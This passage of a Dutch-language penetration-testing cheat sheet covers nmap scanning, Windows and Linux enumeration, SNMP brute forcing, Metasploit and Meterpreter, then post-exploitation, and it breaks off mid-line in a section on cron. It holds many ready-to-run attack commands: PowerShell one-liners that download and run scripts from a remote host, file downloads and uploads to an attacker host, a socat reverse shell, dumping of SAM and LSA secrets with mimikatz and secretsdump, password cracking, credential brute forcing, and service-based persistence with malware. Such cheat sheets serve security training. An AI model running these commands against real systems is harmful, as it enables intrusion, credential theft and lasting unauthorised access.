- **Unreliable**: Afhankelijk van zombie behavior
- **Limited**: Alleen TCP SYN scans mogelijk

**Zombie Host Requirements:**
- **Predictable IP ID**: Incremental IP ID sequence
- **Idle State**: Geen actieve communicatie
- **No Firewall**: Geen firewall tussen zombie en target
- **Stable**: Betrouwbare host zonder crashes

**Idle Scanning Commands:**
```bash
# Basic idle scan
nmap -sI zombie_ip target.com

# Specific ports
nmap -sI zombie_ip -p 80,443,22 target.com

# Verbose output
nmap -sI zombie_ip -v target.com

# Port range
nmap -sI zombie_ip -p 1-1000 target.com
```

#### ACK Scanning
```bash
nmap -sA target.com
```
- **Functionaliteit**: Alleen ACK flag gezet
- **Detectie**: Voor firewall mapping
- **Gebruik**: Firewall regels detecteren

### UDP Scanning

```bash
# UDP scan
nmap -sU target.com

# Specifieke poorten
nmap -sU -p 53,161,500 target.com

# Verbose output
nmap -sU -v target.com
```

### TCP Flags

#### Basis TCP Flags
- **SYN (Synchronize)**: Initiëert verbinding, synchroniseert sequence numbers
- **ACK (Acknowledge)**: Bevestigt ontvangst van data
- **FIN (Finish)**: Beëindigt verbinding graceful
- **RST (Reset)**: Reset verbinding abrupt
- **PSH (Push)**: Dringt data door naar applicatie layer
- **URG (Urgent)**: Markeert urgente data

#### Gedetailleerde TCP Flag Uitleg

**SYN (Synchronize):**
- **Functie**: Initiëert TCP verbinding
- **Sequence Number**: Zet initial sequence number
- **Window Size**: Specificeert receive window size
- **MSS**: Maximum Segment Size
- **Options**: TCP options zoals SACK, timestamps

**ACK (Acknowledge):**
- **Functie**: Bevestigt ontvangst van data
- **Acknowledgment Number**: Volgende verwachte sequence number
- **Window Size**: Huidige receive window size
- **Gebruik**: In alle packets na SYN

**FIN (Finish):**
- **Functie**: Graceful connection termination
- **Sequence Number**: Laatste data sequence number
- **Response**: Moet bevestigd worden met ACK
- **State**: Verandert connection state naar FIN_WAIT

**RST (Reset):**
- **Functie**: Abrupt connection termination
- **Sequence Number**: Laatste sequence number
- **Response**: Geen ACK vereist
- **State**: Verandert connection state naar CLOSED

**PSH (Push):**
- **Functie**: Dringt data door naar applicatie
- **Buffer**: Leegt TCP send buffer
- **Timing**: Onmiddellijke data delivery
- **Gebruik**: HTTP requests, telnet commands

**URG (Urgent):**
- **Functie**: Markeert urgente data
- **Urgent Pointer**: Offset naar urgente data
- **Priority**: Hoge prioriteit data
- **Gebruik**: Telnet interrupt, SSH escape

#### TCP Flag Combinaties

**SYN/ACK:**
- **Gebruik**: Response op SYN packet
- **State**: Connection establishment
- **Sequence**: Server's initial sequence number

**FIN/ACK:**
- **Gebruik**: Graceful connection close
- **State**: Connection termination
- **Sequence**: Laatste data sequence number

**RST/ACK:**
- **Gebruik**: Abrupt connection close
- **State**: Connection reset
- **Sequence**: Laatste sequence number

#### TCP Flag Tabel
| Flag | Bit | Functie | Gebruik |
|------|-----|---------|---------|
| SYN | 2 | Connection initiation | 3-way handshake |
| ACK | 16 | Data acknowledgment | All data packets |
| FIN | 1 | Graceful close | Connection termination |
| RST | 4 | Abrupt close | Error conditions |
| PSH | 8 | Push data | Immediate delivery |
| URG | 32 | Urgent data | High priority data |


### Port States

#### Basis Port States
- **Open**: Service luistert op poort en accepteert verbindingen
- **Closed**: Geen service op poort, maar poort is bereikbaar
- **Filtered**: Firewall blokkeert poort, geen response ontvangen

#### Geavanceerde Port States
- **Open|Filtered**: Onzeker of open of gefilterd (UDP scans)
- **Closed|Filtered**: Onzeker of gesloten of gefilterd (UDP scans)
- **Unfiltered**: Poort is bereikbaar maar status onbekend (ACK scans)

#### Port State Detectie
```bash
# Open port response
SYN -> SYN/ACK (Open)

# Closed port response  
SYN -> RST/ACK (Closed)

# Filtered port response
SYN -> (No response) (Filtered)

# Open|Filtered (UDP)
UDP -> (No response) (Open|Filtered)

# Closed|Filtered (UDP)
UDP -> ICMP Port Unreachable (Closed|Filtered)
```

#### Gedetailleerde Nmap Port States Tabel

| State | TCP Response | UDP Response | ICMP Response | Meaning | Detection Method |
|-------|-------------|--------------|---------------|---------|------------------|
| **Open** | SYN/ACK | Service response | None | Service active and accepting connections | SYN scan, Connect scan |
| **Closed** | RST/ACK | ICMP Port Unreachable | Port Unreachable | Port reachable but no service listening | SYN scan, UDP scan |
| **Filtered** | No response | No response | None | Firewall/IDS blocking packets | SYN scan, UDP scan |
| **Open\|Filtered** | N/A | No response | None | Unknown (UDP only) | UDP scan |
| **Closed\|Filtered** | N/A | No response | None | Unknown (UDP only) | UDP scan |
| **Unfiltered** | RST/ACK | N/A | None | Port reachable but status unknown | ACK scan |
| **Open\|Unfiltered** | SYN/ACK | N/A | None | Port open and unfiltered | ACK scan |

#### Network Sweep/Ping Sweep Details

**Ping Sweep Techniques:**
```bash
# ICMP Echo Request (ping)
ping -c 1 192.168.1.1

# ICMP Timestamp Request
ping -c 1 -T tsonly 192.168.1.1

# ICMP Address Mask Request
ping -c 1 -T addr 192.168.1.1

# ICMP Information Request
ping -c 1 -T info 192.168.1.1
```

**Nmap Host Discovery:**
```bash
# Ping scan (host discovery only)
nmap -sn 192.168.1.0/24

# Skip ping (assume all hosts up)
nmap -Pn 192.168.1.0/24

# ARP ping scan
nmap -PR 192.168.1.0/24

# TCP SYN ping
nmap -PS80,443 192.168.1.0/24

# TCP ACK ping
nmap -PA80,443 192.168.1.0/24

# UDP ping
nmap -PU53,161 192.168.1.0/24

# SCTP INIT ping
nmap -PY 192.168.1.0/24

# ICMP ping
nmap -PE 192.168.1.0/24

# ICMP timestamp ping
nmap -PP 192.168.1.0/24

# ICMP address mask ping
nmap -PM 192.168.1.0/24
```

**Host Discovery Tabel:**
| Method | Protocol | Port | Description | Stealth |
|--------|----------|------|-------------|---------|
| ICMP Echo | ICMP | N/A | Standard ping | Low |
| ICMP Timestamp | ICMP | N/A | Timestamp request | Medium |
| ICMP Address Mask | ICMP | N/A | Address mask request | Medium |
| TCP SYN | TCP | 80,443 | SYN packet | High |
| TCP ACK | TCP | 80,443 | ACK packet | High |
| UDP | UDP | 53,161 | UDP packet | High |
| SCTP INIT | SCTP | N/A | SCTP INIT | High |
| ARP | ARP | N/A | ARP request | Very High |

**Host Discovery Options:**
```bash
# Custom ping options
nmap -sn --packet-trace 192.168.1.0/24

# Verbose output
nmap -sn -v 192.168.1.0/24

# Timing control
nmap -sn -T4 192.168.1.0/24

# Exclude hosts
nmap -sn --exclude 192.168.1.100 192.168.1.0/24

# Include hosts only
nmap -sn --include 192.168.1.1-10 192.168.1.0/24
```

### Nmap Opties

#### Basis Opties:
```bash
# Ping scan (host discovery)
nmap -sn 192.168.1.0/24

# Skip ping (assume host is up)
nmap -Pn target.com

# Scan alle poorten
nmap -p- target.com

# Fast scan (top 1000 poorten)
nmap -F target.com

# UDP scan
nmap -sU target.com

# OS detection
nmap -O target.com

# Service version detection
nmap -sV target.com

# Script scanning
nmap -sC target.com
```

#### Output Opties:
```bash
# Normal output
nmap -oN results.txt target.com

# XML output
nmap -oX results.xml target.com

# Grepable output
nmap -oG results.grep target.com

# All formats
nmap -oA results target.com
```

#### Geavanceerde Opties:
```bash
# Timing template (0-5)
nmap -T4 target.com

# Custom port range
nmap -p 1-1000 target.com

# Exclude hosts
nmap --exclude 192.168.1.100 target.com

# Custom scripts
nmap --script vuln target.com

# Aggressive scan
nmap -A target.com
```

### Fingerprinting

#### Actief vs Passief Fingerprinting

**Actief Fingerprinting:**
- Directe interactie met target
- Meer detecteerbaar
- Meer accurate resultaten
- Voorbeelden: Nmap, Nessus

**Passief Fingerprinting:**
- Geen directe interactie
- Minder detecteerbaar
- Minder accurate resultaten
- Voorbeelden: p0f, ettercap

#### TTL Values
- **Linux**: 64
- **Windows**: 128
- **Cisco**: 255
- **FreeBSD**: 64

#### TCP Window Sizes
- **Linux**: 5840
- **Windows**: 65535
- **Cisco**: 4128

---

## Enumeration

### Windows Enumeration

#### Users/Groups/Machines & SIDs

**SID Structure:**
- **S-1-5-21-**: Windows SID prefix
- **RID 500**: Administrator account
- **RID 501**: Guest account
- **RID 1000+**: Regular users

**Enumeration Commands:**
```cmd
# Current user info
whoami /user

# All users
net user

# Specific user details
net user username

# Local groups
net localgroup

# Domain users
net user /domain

# Domain groups
net group /domain
```

#### SAM Database
- **Location**: C:\Windows\System32\config\SAM
- **Access**: Requires SYSTEM privileges
- **Tools**: mimikatz, samdump2, pwdump

#### Active Directory (ntds.dit)
- **Location**: C:\Windows\NTDS\ntds.dit
- **Access**: Requires Domain Controller access
- **Tools**: ntdsutil, mimikatz, secretsdump

#### Null Sessions
```cmd
# Enable null session
net use \\target\IPC$ "" /u:""

# Enumeration via null session
enum4linux target.com
rpcclient -U "" -N target.com
```

**Preventie van Null Sessions:**
- Registry key: `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa`
- Value: `RestrictAnonymous` = 1 of 2

#### Windows Registry Keys voor Null Session Prevention

**RestrictAnonymous Registry Settings:**
```cmd
# Check current setting
reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa" /v RestrictAnonymous

# Set to level 1 (restrict anonymous access)
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa" /v RestrictAnonymous /t REG_DWORD /d 1 /f

# Set to level 2 (restrict anonymous access and enumeration)
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa" /v RestrictAnonymous /t REG_DWORD /d 2 /f
```

**RestrictAnonymous Levels:**
- **0**: Allow anonymous access (default)
- **1**: Restrict anonymous access to named pipes and shares
- **2**: Restrict anonymous access to named pipes, shares, and registry

**Additional Registry Keys:**
```cmd
# Restrict anonymous access to registry
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa" /v RestrictAnonymousSam /t REG_DWORD /d 1 /f

# Restrict anonymous access to shares
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\lanmanserver\parameters" /v RestrictNullSessAccess /t REG_DWORD /d 1 /f

# Disable anonymous SID/Name translation
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa" /v LSAAnonymousNameLookup /t REG_DWORD /d 0 /f
```

**Registry Key Tabel:**
| Key | Value | Setting | Effect |
|-----|-------|---------|--------|
| RestrictAnonymous | 0 | Disabled | Allow anonymous access |
| RestrictAnonymous | 1 | Level 1 | Restrict pipes/shares |
| RestrictAnonymous | 2 | Level 2 | Restrict pipes/shares/registry |
| RestrictAnonymousSam | 1 | Enabled | Restrict SAM enumeration |
| RestrictNullSessAccess | 1 | Enabled | Restrict null session access |
| LSAAnonymousNameLookup | 0 | Disabled | Disable SID/Name translation |

#### Group Policy Objects (GPO)

**GPO Enumeration:**
```cmd
# GPO enumeration
gpresult /r
gpresult /h report.html

# GPO backup
gpresult /z

# GPO for specific user
gpresult /user username /r

# GPO for specific computer
gpresult /computer computername /r

# GPO scope
gpresult /scope computer /r
gpresult /scope user /r
```

**GPO Commands:**
```cmd
# List all GPOs
gpresult /r /scope computer

# GPO details
gpresult /r /scope computer /v

# GPO security settings
gpresult /r /scope computer /h gpo_report.html

# GPO registry settings
gpresult /r /scope computer /z
```

**GPO Locations:**
- **SYSVOL**: `\\domain.com\SYSVOL\domain.com\Policies\`
- **Registry**: `HKEY_LOCAL_MACHINE\SOFTWARE\Policies\`
- **Local GPO**: `C:\Windows\System32\GroupPolicy\`

**GPO Enumeration Tools:**
```cmd
# PowerView
Get-NetGPO
Get-NetGPOGroup
Get-ObjectAcl -Name "GPO Name"

# GPOcmd
gpo.cmd /target:computer /user:username

# Gpresult
gpresult /r /scope computer /v
```

#### LSA (Local Security Authority)

**LSA Enumeration:**
```cmd
# LSA secrets dump
reg save HKLM\SECURITY security.hive
reg save HKLM\SAM sam.hive
reg save HKLM\SYSTEM system.hive

# LSA policy dump
secretsdump.py -system system.hive -security security.hive LOCAL

# LSA registry keys
reg query "HKLM\SECURITY\Policy\Secrets"
reg query "HKLM\SECURITY\Policy\PolAdtEv"
reg query "HKLM\SECURITY\Policy\PolPrDmN"
```

**LSA Secrets:**
- **LSA Secrets**: Encrypted passwords and service accounts
- **Cached Credentials**: Domain credentials cache
- **Service Accounts**: Service account passwords
- **DPAPI Keys**: Data Protection API keys

**LSA Commands:**
```cmd
# LSA policy information
reg query "HKLM\SECURITY\Policy\PolPrDmN" /v F

# LSA audit policy
reg query "HKLM\SECURITY\Policy\PolAdtEv"

# LSA privileges
reg query "HKLM\SECURITY\Policy\Privs"

# LSA accounts
reg query "HKLM\SECURITY\Policy\Accounts"
```

**LSA Tools:**
```bash
# Mimikatz
mimikatz # lsadump::secrets
mimikatz # lsadump::cache
mimikatz # lsadump::sam

# Secretsdump
secretsdump.py -system system.hive -security security.hive LOCAL

# LSA secrets extractor
lsaextract.py -system system.hive -security security.hive
```

**LSA Registry Keys:**
| Key | Description | Access |
|-----|-------------|--------|
| HKLM\SECURITY\Policy\Secrets | LSA secrets | SYSTEM only |
| HKLM\SECURITY\Policy\PolAdtEv | Audit policy | SYSTEM only |
| HKLM\SECURITY\Policy\PolPrDmN | Domain name | SYSTEM only |
| HKLM\SECURITY\Policy\Accounts | Account information | SYSTEM only |
| HKLM\SECURITY\Policy\Privs | Privileges | SYSTEM only |

### Linux Enumeration

#### /etc/passwd Structuur
```
username:x:UID:GID:GECOS:home_directory:shell
```

**Voorbeelden:**
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

#### /etc/shadow Structuur
```
username:password_hash:last_change:min:max:warn:inactive:expire:reserved
```

**Hash Types:**
- **$1$**: MD5
- **$2$**: Blowfish
- **$5$**: SHA-256
- **$6$**: SHA-512

#### UID Ranges
- **0**: Root user
- **1-99**: System accounts
- **100-999**: System services
- **1000-10000**: Regular users
- **10000+**: Service accounts

#### GID Ranges
- **0**: Root group
- **1-99**: System groups
- **100-999**: System service groups
- **1000+**: User groups

#### Unshadow Tool
```bash
# Combine passwd and shadow files
unshadow /etc/passwd /etc/shadow > combined.txt

# Crack with John
john combined.txt

# Show cracked passwords
john --show combined.txt
```

### Network Enumeration

#### DNS Zone Transfers (AXFR)
```bash
# Zone transfer attempt
dig @dns_server target.com AXFR

# Using nslookup
nslookup
> server dns_server
> ls -d target.com
```

#### SNMP Enumeration

**SNMP Versions:**
- **v1**: Geen encryptie, community strings
- **v2c**: Verbeterde v1, nog steeds community strings
- **v3**: Encryptie en authenticatie

**Community Strings:**
- **public**: Default read-only
- **private**: Default read-write
- **Common**: admin, administrator, manager

**Tools:**
```bash
# SNMP walk
snmpwalk -c public -v2c target.com

# SNMP enumeration
snmp-check target.com

# OneSixtyOne (brute force)
onesixtone -c community.txt target.com
```

#### SNMP Versions Vergelijking

| Feature | SNMPv1 | SNMPv2c | SNMPv3 |
|---------|--------|---------|--------|
| **Security Model** | Community-based | Community-based | User-based |
| **Authentication** | None | None | MD5, SHA |
| **Encryption** | None | None | DES, AES |
| **Community Strings** | Plaintext | Plaintext | N/A |
| **Error Handling** | Basic | Improved | Advanced |
| **Bulk Operations** | No | Yes | Yes |
| **Port** | 161 (UDP) | 161 (UDP) | 161 (UDP) |
| **Status** | Obsolete | Obsolete | Recommended |
| **Security Level** | Low | Low | High |

#### SNMP Community String Brute Force

**Common Community Strings:**
```
public
private
community
admin
administrator
manager
snmp
snmpd
cisco
default
guest
monitor
read
write
```

**Brute Force Tools:**
```bash
# OneSixtyOne
onesixtone -c community.txt target.com

# SNMPwalk with wordlist
for word in $(cat community.txt); do
    snmpwalk -c $word -v2c target.com 2>/dev/null
done

# SNMP-check
snmp-check -c public -v2c target.com
```

#### MIB en OID

**MIB (Management Information Base):**
- **Definitie**: Database van SNMP objecten
- **Structuur**: Hiërarchische OID structuur
- **Standard**: RFC 1155, RFC 1213

**OID (Object Identifier):**
- **Format**: 1.3.6.1.2.1.1.1.0
- **Root**: 1.3.6.1 (ISO.ORG.DOD.INTERNET)
- **MIB-2**: 1.3.6.1.2.1
- **Private**: 1.3.6.1.4 (enterprises)

**Common OIDs:**
- **1.3.6.1.2.1.1.1.0**: System description
- **1.3.6.1.2.1.1.3.0**: System uptime
- **1.3.6.1.2.1.1.4.0**: System contact
- **1.3.6.1.2.1.1.5.0**: System name
- **1.3.6.1.2.1.1.6.0**: System location

#### SNMP OID Tabel

| OID | Name | Description | Access |
|-----|------|-------------|--------|
| 1.3.6.1.2.1.1.1.0 | sysDescr | System description | Read-only |
| 1.3.6.1.2.1.1.2.0 | sysObjectID | System object ID | Read-only |
| 1.3.6.1.2.1.1.3.0 | sysUpTime | System uptime | Read-only |
| 1.3.6.1.2.1.1.4.0 | sysContact | System contact | Read-write |
| 1.3.6.1.2.1.1.5.0 | sysName | System name | Read-write |
| 1.3.6.1.2.1.1.6.0 | sysLocation | System location | Read-write |
| 1.3.6.1.2.1.1.7.0 | sysServices | System services | Read-only |

#### SNMP Enumeration Commands

**Basic SNMP Walk:**
```bash
# System information
snmpwalk -c public -v2c target.com 1.3.6.1.2.1.1

# Interface information
snmpwalk -c public -v2c target.com 1.3.6.1.2.1.2

# Routing table
snmpwalk -c public -v2c target.com 1.3.6.1.2.1.4

# TCP connections
snmpwalk -c public -v2c target.com 1.3.6.1.2.1.6
```

**SNMP Security:**
```bash
# Check SNMP version
snmpwalk -c public -v1 target.com 1.3.6.1.2.1.1.1.0
snmpwalk -c public -v2c target.com 1.3.6.1.2.1.1.1.0
snmpwalk -c public -v3 target.com 1.3.6.1.2.1.1.1.0

# SNMPv3 with authentication
snmpwalk -v3 -u username -a MD5 -A password target.com 1.3.6.1.2.1.1
```

---

## Metasploit Framework

### Module Categories

#### Auxiliary Modules
- **Function**: Information gathering, scanning, fuzzing
- **Examples**: port_scanner, smb_version, http_version
- **Usage**: `use auxiliary/scanner/portscan/tcp`

#### Exploit Modules
- **Function**: Exploit vulnerabilities
- **Examples**: ms17_010_eternalblue, ms08_067_netapi
- **Usage**: `use exploit/windows/smb/ms17_010_eternalblue`

#### Payload Modules
- **Function**: Code execution after exploitation
- **Examples**: windows/meterpreter/reverse_tcp, linux/x86/shell_reverse_tcp
- **Usage**: `set payload windows/meterpreter/reverse_tcp`

#### Post Modules
- **Function**: Post-exploitation activities
- **Examples**: hashdump, enum_logged_on_users, screenshot
- **Usage**: `run post/windows/gather/hashdump`

#### Encoder Modules
- **Function**: Encode payloads to avoid detection
- **Examples**: x86/shikata_ga_nai, x86/alpha_upper
- **Usage**: `set encoder x86/shikata_ga_nai`

#### NOP Modules
- **Function**: No-operation instructions
- **Examples**: x86/single_byte, x86/opty2
- **Usage**: `set nop x86/single_byte`

### Database Setup

#### PostgreSQL Setup
```bash
# Start PostgreSQL
sudo systemctl start postgresql

# Initialize Metasploit database
msfdb init

# Check database status
msfconsole
msf6 > db_status
```

#### Workspace Management
```bash
# Create workspace
msf6 > workspace -a pentest

# List workspaces
msf6 > workspace

# Switch workspace
msf6 > workspace pentest

# Delete workspace
msf6 > workspace -d old_workspace
```

### Specifieke Protocol Modules

#### FTP Modules

**FTP Anonymous Login:**
```bash
use auxiliary/scanner/ftp/anonymous
set RHOSTS 192.168.1.0/24
set THREADS 10
run
```

**FTP Version Detection:**
```bash
use auxiliary/scanner/ftp/ftp_version
set RHOSTS 192.168.1.0/24
set THREADS 10
run
```

**FTP Brute Force:**
```bash
use auxiliary/scanner/ftp/ftp_login
set RHOSTS 192.168.1.0/24
set USER_FILE /usr/share/wordlists/usernames.txt
set PASS_FILE /usr/share/wordlists/passwords.txt
set THREADS 10
run
```

**FTP Bounce Scan:**
```bash
use auxiliary/scanner/ftp/ftp_bounce
set RHOSTS 192.168.1.0/24
set RPORT 21
set BOUNCEHOST 192.168.1.100
run
```

**FTP Modules Tabel:**
| Module | Function | Port | Description |
|--------|----------|------|-------------|
| auxiliary/scanner/ftp/anonymous | Anonymous login check | 21 | Check for anonymous FTP access |
| auxiliary/scanner/ftp/ftp_version | Version detection | 21 | Detect FTP server version |
| auxiliary/scanner/ftp/ftp_login | Brute force login | 21 | Brute force FTP credentials |
| auxiliary/scanner/ftp/ftp_bounce | Bounce scan | 21 | FTP bounce port scan |

#### SMB Modules

**SMB Version Detection:**
```bash
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.0/24
set THREADS 10
run
```

**SMB Enumeration:**
```bash
use auxiliary/scanner/smb/smb_enumshares
set RHOSTS 192.168.1.0/24
set SMBUser guest
set SMBPass ""
set THREADS 10
run
```

**SMB Login:**
```bash
use auxiliary/scanner/smb/smb_login
set RHOSTS 192.168.1.0/24
set USER_FILE /usr/share/wordlists/usernames.txt
set PASS_FILE /usr/share/wordlists/passwords.txt
set THREADS 10
run
```

**SMB Enumeration Users:**
```bash
use auxiliary/scanner/smb/smb_enumusers
set RHOSTS 192.168.1.0/24
set SMBUser guest
set SMBPass ""
set THREADS 10
run
```

**SMB Modules Tabel:**
| Module | Function | Port | Description |
|--------|----------|------|-------------|
| auxiliary/scanner/smb/smb_version | Version detection | 445 | Detect SMB server version |
| auxiliary/scanner/smb/smb_enumshares | Share enumeration | 445 | Enumerate SMB shares |
| auxiliary/scanner/smb/smb_login | Brute force login | 445 | Brute force SMB credentials |
| auxiliary/scanner/smb/smb_enumusers | User enumeration | 445 | Enumerate SMB users |

#### MySQL Modules

**MySQL Version Detection:**
```bash
use auxiliary/scanner/mysql/mysql_version
set RHOSTS 192.168.1.0/24
set THREADS 10
run
```

**MySQL Login:**
```bash
use auxiliary/scanner/mysql/mysql_login
set RHOSTS 192.168.1.0/24
set USER_FILE /usr/share/wordlists/usernames.txt
set PASS_FILE /usr/share/wordlists/passwords.txt
set THREADS 10
run
```

**MySQL Enumeration:**
```bash
use auxiliary/admin/mysql/mysql_enum
set RHOSTS 192.168.1.0/24
set USERNAME root
set PASSWORD ""
set THREADS 10
run
```

**MySQL Hashdump:**
```bash
use auxiliary/scanner/mysql/mysql_hashdump
set RHOSTS 192.168.1.0/24
set USERNAME root
set PASSWORD ""
set THREADS 10
run
```

**MySQL Modules Tabel:**
| Module | Function | Port | Description |
|--------|----------|------|-------------|
| auxiliary/scanner/mysql/mysql_version | Version detection | 3306 | Detect MySQL server version |
| auxiliary/scanner/mysql/mysql_login | Brute force login | 3306 | Brute force MySQL credentials |
| auxiliary/admin/mysql/mysql_enum | Database enumeration | 3306 | Enumerate MySQL databases |
| auxiliary/scanner/mysql/mysql_hashdump | Hash extraction | 3306 | Extract MySQL password hashes |

#### SSH Modules

**SSH Version Detection:**
```bash
use auxiliary/scanner/ssh/ssh_version
set RHOSTS 192.168.1.0/24
set THREADS 10
run
```

**SSH Login:**
```bash
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.1.0/24
set USER_FILE /usr/share/wordlists/usernames.txt
set PASS_FILE /usr/share/wordlists/passwords.txt
set THREADS 10
run
```

**SSH User Enumeration:**
```bash
use auxiliary/scanner/ssh/ssh_enumusers
set RHOSTS 192.168.1.0/24
set USER_FILE /usr/share/wordlists/usernames.txt
set THREADS 10
run
```

**SSH Public Key Login:**
```bash
use auxiliary/scanner/ssh/ssh_login_pubkey
set RHOSTS 192.168.1.0/24
set USERNAME root
set KEY_FILE /path/to/private/key
set THREADS 10
run
```

**SSH Modules Tabel:**
| Module | Function | Port | Description |
|--------|----------|------|-------------|
| auxiliary/scanner/ssh/ssh_version | Version detection | 22 | Detect SSH server version |
| auxiliary/scanner/ssh/ssh_login | Brute force login | 22 | Brute force SSH credentials |
| auxiliary/scanner/ssh/ssh_enumusers | User enumeration | 22 | Enumerate SSH users |
| auxiliary/scanner/ssh/ssh_login_pubkey | Public key login | 22 | SSH public key authentication |

#### SMTP Modules

**SMTP Version Detection:**
```bash
use auxiliary/scanner/smtp/smtp_version
set RHOSTS 192.168.1.0/24
set THREADS 10
run
```

**SMTP Enumeration:**
```bash
use auxiliary/scanner/smtp/smtp_enum
set RHOSTS 192.168.1.0/24
set USER_FILE /usr/share/wordlists/usernames.txt
set THREADS 10
run
```

**SMTP Relay:**
```bash
use auxiliary/scanner/smtp/smtp_relay
set RHOSTS 192.168.1.0/24
set MAILFROM test@example.com
set MAILTO test@target.com
set THREADS 10
run
```

**SMTP Login:**
```bash
use auxiliary/scanner/smtp/smtp_login
set RHOSTS 192.168.1.0/24
set USER_FILE /usr/share/wordlists/usernames.txt
set PASS_FILE /usr/share/wordlists/passwords.txt
set THREADS 10
run
```

**SMTP Modules Tabel:**
| Module | Function | Port | Description |
|--------|----------|------|-------------|
| auxiliary/scanner/smtp/smtp_version | Version detection | 25 | Detect SMTP server version |
| auxiliary/scanner/smtp/smtp_enum | User enumeration | 25 | Enumerate SMTP users |
| auxiliary/scanner/smtp/smtp_relay | Relay testing | 25 | Test SMTP relay functionality |
| auxiliary/scanner/smtp/smtp_login | Brute force login | 25 | Brute force SMTP credentials |

### Meterpreter Commands

#### Basis Commands
```bash
# System information
sysinfo

# Current user
getuid

# Process list
ps

# Network interfaces
ipconfig

# Routing table
route

# Background session
background

# List sessions
sessions

# Interact with session
sessions -i 1
```

#### File System Commands
```bash
# List directory
ls

# Change directory
cd

# Download file
download file.txt

# Upload file
upload file.txt

# Search files
search -f *.txt

# Edit file
edit file.txt
```

#### Network Commands
```bash
# Port forwarding
portfwd add -l 8080 -p 80 -r target.com

# Reverse port forwarding
portfwd add -R -l 8080 -p 80

# List port forwards
portfwd list

# Remove port forward
portfwd delete -l 8080
```

#### Privilege Escalation
```bash
# Get system privileges
getsystem

# Load privilege escalation modules
load priv

# Hash dump
hashdump

# Password dump
load mimikatz
wdigest
msv
```

---

## Post-Exploitation

### Local Enumeration

#### System Information
```bash
# Windows system info
systeminfo
wmic computersystem get name,domain,manufacturer,model
wmic os get name,version,architecture

# Linux system info
uname -a
cat /etc/os-release
hostnamectl
```

#### Users and Groups
```bash
# Windows users
net user
net localgroup administrators
net user /domain

# Linux users
cat /etc/passwd
cat /etc/group
id
groups
```

#### Network Information
```bash
# Windows network
ipconfig /all
netstat -an
arp -a
route print

# Linux network
ifconfig -a
netstat -tulpn
arp -a
route -n
```

#### Processes and Services
```bash
# Windows processes
tasklist
tasklist /svc
sc query

# Linux processes
ps aux
ps -ef
systemctl list-units
```

### Automation Tools

#### JAWS (Just Another Windows (Enum) Script)
```powershell
# Download and run JAWS
IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.9:8000/jaWws.ps1')
```

**JAWS Output:**
- System information
- User accounts
- Network configuration
- Installed software
- Running services
- Scheduled tasks

#### LinEnum
```bash
# Download and run LinEnum
wget http://10.10.14.9:8000/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh
```

**LinEnum Output:**
- Kernel information
- User accounts
- SUID/SGID files
- World writable files
- Cron jobs
- Network configuration

### File Transfers

#### Python Web Server
```bash
# Python 3
python3 -m http.server 8000

# Python 2
python -m SimpleHTTPServer 8000

# Download from target
wget http://attacker:8000/file.txt
curl http://attacker:8000/file.txt -o file.txt
```

#### Certutil (Windows)
```cmd
# Download file
certutil -urlcache -split -f http://attacker:8000/file.txt file.txt

# Base64 encode
certutil -encode file.txt encoded.txt

# Base64 decode
certutil -decode encoded.txt file.txt
```

#### Wget/Curl
```bash
# Download with wget
wget http://attacker:8000/file.txt

# Download with curl
curl http://attacker:8000/file.txt -o file.txt

# Upload with curl
curl -X POST -F "file=@file.txt" http://attacker:8000/upload
```

### Shell Upgrading

#### Upgrade to Interactive Shell
```bash
# Python PTY
python -c 'import pty; pty.spawn("/bin/bash")'

# Upgrade to full TTY
python -c 'import pty; pty.spawn("/bin/bash")'
# Press Ctrl+Z
stty raw -echo
fg
export TERM=xterm
```

#### Socat
```bash
# On attacker machine
socat file:`tty`,raw,echo=0 tcp-listen:4444

# On target machine
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker:4444
```

### Privilege Escalation

#### PrivescCheck (Windows)
```powershell
# Download and run PrivescCheck
IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.9:8000/PrivescCheck.ps1')
Invoke-PrivescCheck
```

#### Weak Permissions
```bash
# Find world writable files
find / -writable -type f 2>/dev/null

# Find SUID files
find / -perm -4000 -type f 2>/dev/null

# Find SGID files
find / -perm -2000 -type f 2>/dev/null
```

#### Sudo Privileges
```bash
# Check sudo privileges
sudo -l

# Common sudo exploits
sudo -u root /bin/bash
sudo -u root /usr/bin/vim
sudo -u root /usr/bin/nano
```

### Persistence

#### Windows Services
```cmd
# Create service
sc create "ServiceName" binpath="C:\path\to\malware.exe"
sc start "ServiceName"

# Modify existing service
sc config "ServiceName" binpath="C:\path\to\malware.exe"
```

#### RDP Access
```cmd
# Enable RDP
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

# Add user to RDP group
net localgroup "Remote Desktop Users" username /add
```

#### SSH Access
```bash
# Add SSH key
mkdir -p ~/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2E..." >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```

#### Cron Jobs

**Cron Syntax:**
```
* * * * * command
│ │ │ │ │
│ │ │ │ └── Day of week (0-7)
│ │ │ └──── Month (1-12)
│ │ └────── Day of month (1-31)
│ └──────── Hour (0-23)
└────────── Minute (0-59)
```

**Cron Examples:**
```bash
# Every 5 minutes
*/5 * * * * /path/to/script.sh

# Every day at 2:30 AM
30 2 * * * /path/to/script.sh

# Every Monday at 9:00 AM
0 9 * * 1 /path/to/script.sh
```

**Cron Commands:**
```bash
# List current user's crontab
crontab -l

# Edit current user's crontab
crontab -e

# List specific user's crontab
crontab -l -u username

# Edit specific user's crontab
